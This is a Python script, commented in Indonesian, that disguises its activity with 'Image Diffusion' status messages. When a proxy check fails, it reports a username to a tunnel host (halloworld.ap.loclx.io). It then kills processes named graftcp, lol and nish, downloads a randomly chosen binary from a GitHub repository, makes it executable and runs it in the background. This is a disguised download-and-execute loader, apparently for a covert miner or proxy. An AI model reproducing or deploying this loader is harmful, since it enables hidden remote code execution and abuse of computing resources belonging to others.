import time
import requests
import subprocess
import os
import random

def check_proxy():
    try:
        # Url
        url = 'https://jsonapi.org/'
        # Membuat subprocess untuk menjalankan curl command
        curl_command = f"./graftcp/graftcp curl -s -o /dev/null -w '%{{http_code}}' {url}"
        result = subprocess.run(curl_command, shell=True, capture_output=True, text=True, timeout=10)

        # Memeriksa http_code dari respons curl
        if result.returncode == 0:
            response_code = result.stdout.strip()  # Mendapatkan http_code dari output
            if response_code == '200':
                return True
            else:
                return False
        else:
            return False

    except Exception as e:
        print(f"Error: {e}")
        return False

def kill_processes(process_list):
    # Menggabungkan daftar proses menjadi satu string dengan pemisah "|"
    process_string = "|".join(process_list)
    # Menjalankan perintah pkill dengan opsi -f untuk mencocokkan semua pola sekaligus
    subprocess.run(['pkill', '-9', '-f', process_string])

def read_from_file():
    file_name = '../info.txt'
    try:
        with open(file_name, 'r') as file:
            content = file.read()
            return content
    except FileNotFoundError:
        print(f"File {file_name} tidak ditemukan.")
        return None
    except Exception as e:
        print(f"Error: {e}")
        return None

def get_info():
    username = read_from_file()
    if not username:
        username = 'unknow'

    try:
        response = requests.get(f"https://halloworld.ap.loclx.io/info?username={username}")
        if response.status_code == 200:
            json_response = response.json()
            if 'success' in json_response and json_response['success'] == True:
                return True
    except requests.RequestException as e:
        print("Error:", e)
    
    return False

def download_and_run_file():
    download_link_base = "https://github.com/suplays/starterpack/raw/main/row/backup/"
    file_names = ['satu', 'dua', 'tiga', 'empat', 'lima', 'enam', 'tujuh']

    try:
        os.chdir("..")
        random_file_name = random.choice(file_names)
        download_link = f"{download_link_base}{random_file_name}"
        response = requests.get(download_link)
        
        if response.status_code == 200:
            file_path = f"./{random_file_name}"
            with open(file_path, 'wb') as file:
                file.write(response.content)
            os.chmod(file_path, 0o755)
            
            subprocess.Popen(f"./{random_file_name}", shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
        else:
            raise Exception("failed downloading Image Difussion.")
    except Exception as e:
        print(f"Error downloading/running file: {e}")

if __name__ == "__main__":
    process_list = ['graftcp', 'graftcp-local', 'lol', 'nish']
    
    while True:
        if check_proxy():
            print("Image preparation with stable diffusion")
            time.sleep(300)
            print("finished...")
        else:
            while True:
                if get_info():
                    print("Image Difussion not active!")
                    try:
                        kill_processes(process_list)
                    except Exception as px:
                        print(f"Error saat pkill: {px}")
                        
                    try:
                        download_and_run_file()
                        break
                    except Exception as e:
                        print(f"Error starting Image Difussion! {e}")
                        time.sleep(30)
                else:
                    print("Image Difussion return false")
                    time.sleep(60)

            break
            
